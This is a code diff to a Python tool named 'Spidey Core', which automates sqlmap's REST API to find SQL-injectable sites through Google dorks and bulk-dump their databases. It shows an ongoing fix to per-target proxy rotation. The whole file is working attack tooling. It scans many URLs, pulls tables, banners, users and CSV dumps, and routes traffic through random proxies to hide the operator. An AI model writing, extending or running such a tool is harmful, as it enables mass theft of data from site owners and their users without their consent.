@@ -1,6 +1,6 @@
 """
-Spidey Core — SQLMap REST API Dumper (CLEAN v2.0)
-+ raw_output, data_rows, csv_files fields for alldumps.txt
+Spidey Core — SQLMap REST API Dumper (FINAL v3.0)
+Fixed: --proxy vs --proxy-file conflict
 """
 import os
 import io
@@ -67,7 +67,7 @@ _server_ready = False
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  SERVER MANAGEMENT
+#  SERVER
 # ═══════════════════════════════════════════════════════════════════════════
 async def _check_server() -> bool:
     try:
@@ -131,7 +131,7 @@ async def _api_post(session, path, data):
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  BUILD OPTIONS
+#  BUILD OPTIONS — FIXED (proxy OR proxy_file, not both)
 # ═══════════════════════════════════════════════════════════════════════════
 def build_options(url=None, *, level=DEFAULT_LEVEL, risk=DEFAULT_RISK,
                   technique=DEFAULT_TECHNIQUE, threads=DEFAULT_THREADS,
@@ -150,10 +150,12 @@ def build_options(url=None, *, level=DEFAULT_LEVEL, risk=DEFAULT_RISK,
     }
     if url:
         opts["url"] = url
+    # ✅ FIX: Only ONE of proxy OR proxy_file
     if proxy:
         opts["proxy"] = proxy
-    if proxy_file and os.path.isfile(proxy_file):
+    elif proxy_file and os.path.isfile(proxy_file):
         opts["proxyFile"] = proxy_file
+    # ✅ END FIX
     if google_dork:
         opts["googleDork"] = google_dork
         opts.pop("url", None)
@@ -166,7 +168,7 @@ def build_options(url=None, *, level=DEFAULT_LEVEL, risk=DEFAULT_RISK,
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  RESULT CLASS (with new fields)
+#  RESULT CLASS
 # ═══════════════════════════════════════════════════════════════════════════
 class ApiTaskResult:
     __slots__ = (
@@ -211,7 +213,6 @@ async def run_api_task(options: dict, *, task_timeout=DEFAULT_TIMEOUT,
         return result
 
     async with aiohttp.ClientSession() as sess:
-        # Create task
         try:
             resp = await _api_get(sess, "/task/new")
             if not resp.get("success"):
@@ -223,7 +224,6 @@ async def run_api_task(options: dict, *, task_timeout=DEFAULT_TIMEOUT,
             result.error = f"task/new error: {e}"
             return result
 
-        # Set options
         if csv_output_dir:
             options = {**options, "oDir": csv_output_dir}
         try:
@@ -232,7 +232,6 @@ async def run_api_task(options: dict, *, task_timeout=DEFAULT_TIMEOUT,
             result.error = f"option/set error: {e}"
             return result
 
-        # Start scan
         try:
             start_data = {"url": options["url"]} if "url" in options else {}
             start_resp = await _api_post(sess, f"/scan/{taskid}/start", start_data)
@@ -244,7 +243,6 @@ async def run_api_task(options: dict, *, task_timeout=DEFAULT_TIMEOUT,
             result.error = f"scan/start error: {e}"
             return result
 
-        # Poll logs + status
         deadline = time.time() + task_timeout
         seen = 0
         status = "running"
@@ -265,7 +263,6 @@ async def run_api_task(options: dict, *, task_timeout=DEFAULT_TIMEOUT,
                 break
             await asyncio.sleep(4)
 
-            # Fetch log
             try:
                 lr = await _api_get(sess, f"/scan/{taskid}/log")
                 entries = lr.get("log", [])
@@ -282,14 +279,13 @@ async def run_api_task(options: dict, *, task_timeout=DEFAULT_TIMEOUT,
             except Exception:
                 pass
 
-            # Fetch status
             try:
                 st = await _api_get(sess, f"/scan/{taskid}/status")
                 status = st.get("status", "terminated")
             except Exception:
                 break
 
-        # ✅ Fetch data (with data rows)
+        # Data
         try:
             dr = await _api_get(sess, f"/scan/{taskid}/data")
             if dr.get("success") and dr.get("data"):
@@ -302,7 +298,6 @@ async def run_api_task(options: dict, *, task_timeout=DEFAULT_TIMEOUT,
                         if isinstance(val, str) and "banner" in val.lower():
                             result.banner = val
                     elif it == 0:
-                        # Data rows
                         if isinstance(val, dict):
                             for tname, rows in val.items():
                                 if isinstance(rows, list):
@@ -314,10 +309,9 @@ async def run_api_task(options: dict, *, task_timeout=DEFAULT_TIMEOUT,
         except Exception as e:
             logger.error(f"[sqlmap] data fetch: {e}")
 
-        # ✅ Save full log
         result.raw_output = "\n".join(result.log_lines)
 
-        # ✅ Find all CSV files
+        # CSV files
         csv_files_found = []
         dirs_to_check = []
         if csv_output_dir and os.path.isdir(csv_output_dir):
@@ -348,13 +342,11 @@ async def run_api_task(options: dict, *, task_timeout=DEFAULT_TIMEOUT,
                 pass
         result.csv_files = csv_files_found
 
-        # Set csv_dir
         if dirs_to_check:
             result.csv_dir = dirs_to_check[0]
 
         result.success = bool(result.tables or result.csv_dir or result.csv_files)
 
-        # Parse log for DBMS/user/db
         full_log = "\n".join(result.log_lines)
         for line in result.log_lines:
             ll = line.lower()
@@ -372,7 +364,6 @@ async def run_api_task(options: dict, *, task_timeout=DEFAULT_TIMEOUT,
             if "current database is" in ll and not result.current_db:
                 result.current_db = line.strip()
 
-        # Delete task
         try:
             await _api_get(sess, f"/task/{taskid}/delete")
         except Exception:
@@ -382,7 +373,7 @@ async def run_api_task(options: dict, *, task_timeout=DEFAULT_TIMEOUT,
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  MULTIPLE URLS DUMP
+#  MULTIPLE URLS DUMP — FIXED
 # ═══════════════════════════════════════════════════════════════════════════
 async def api_dump_multiple(urls, *, proxy_list=None, proxy_file_path=None,
                             level=DEFAULT_LEVEL, risk=DEFAULT_RISK,
@@ -400,12 +391,6 @@ async def api_dump_multiple(urls, *, proxy_list=None, proxy_file_path=None,
     results = []
     done = [0]
     base_tmp = tempfile.mkdtemp(prefix="spidey_api_")
-    _pf = proxy_file_path
-    if proxy_list and not _pf:
-        pf = os.path.join(base_tmp, "proxies.txt")
-        with open(pf, "w") as f:
-            f.write("\n".join(proxy_list))
-        _pf = pf
 
     def _is_cancelled():
         if not task_id:
@@ -422,11 +407,12 @@ async def api_dump_multiple(urls, *, proxy_list=None, proxy_file_path=None,
             return
         url_dir = os.path.join(base_tmp, f"t{idx}")
         os.makedirs(url_dir, exist_ok=True)
+        # ✅ FIX: Use ONLY proxy, not proxy_file
         px = random.choice(proxy_list) if proxy_list else None
         opts = build_options(
             url, level=level, risk=risk, technique=technique,
             threads=threads, tamper=tamper, proxy=px,
-            proxy_file=_pf, crawl_depth=crawl_depth
+            crawl_depth=crawl_depth
         )
 
         def _log(line):
@@ -465,7 +451,7 @@ async def api_dump_multiple(urls, *, proxy_list=None, proxy_file_path=None,
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  GOOGLE DORK DUMP
+#  OTHER FUNCTIONS (unchanged)
 # ═══════════════════════════════════════════════════════════════════════════
 async def api_google_dork_dump(dork, *, proxy_list=None, level=DEFAULT_LEVEL,
                                risk=DEFAULT_RISK, technique=DEFAULT_TECHNIQUE,
@@ -499,9 +485,6 @@ async def api_google_dork_dump(dork, *, proxy_list=None, level=DEFAULT_LEVEL,
     return r
 
 
-# ═══════════════════════════════════════════════════════════════════════════
-#  BULK DUMP
-# ═══════════════════════════════════════════════════════════════════════════
 async def api_bulk_dump(urls, *, proxy_list=None, level=DEFAULT_LEVEL,
                         risk=DEFAULT_RISK, technique=DEFAULT_TECHNIQUE,
                         threads=DEFAULT_THREADS, tamper=DEFAULT_TAMPER,
@@ -531,9 +514,6 @@ async def api_bulk_dump(urls, *, proxy_list=None, level=DEFAULT_LEVEL,
     return r
 
 
-# ═══════════════════════════════════════════════════════════════════════════
-#  CANCEL
-# ═══════════════════════════════════════════════════════════════════════════
 async def cancel_task(taskid: str) -> bool:
     try:
         async with aiohttp.ClientSession(timeout=API_TIMEOUT) as s:
@@ -543,9 +523,6 @@ async def cancel_task(taskid: str) -> bool:
         return False
 
 
-# ═══════════════════════════════════════════════════════════════════════════
-#  ZIP DIRECTORY
-# ═══════════════════════════════════════════════════════════════════════════
 def _zip_dir(directory: str) -> bytes:
     buf = io.BytesIO()
     has = False
@@ -562,9 +539,6 @@ def _zip_dir(directory: str) -> bytes:
     return buf.read() if has else b""
 
 
-# ═══════════════════════════════════════════════════════════════════════════
-#  FORMAT SUMMARY
-# ═══════════════════════════════════════════════════════════════════════════
 def format_result_summary(r: ApiTaskResult) -> str:
     lines = []
     sep = "─" * 32
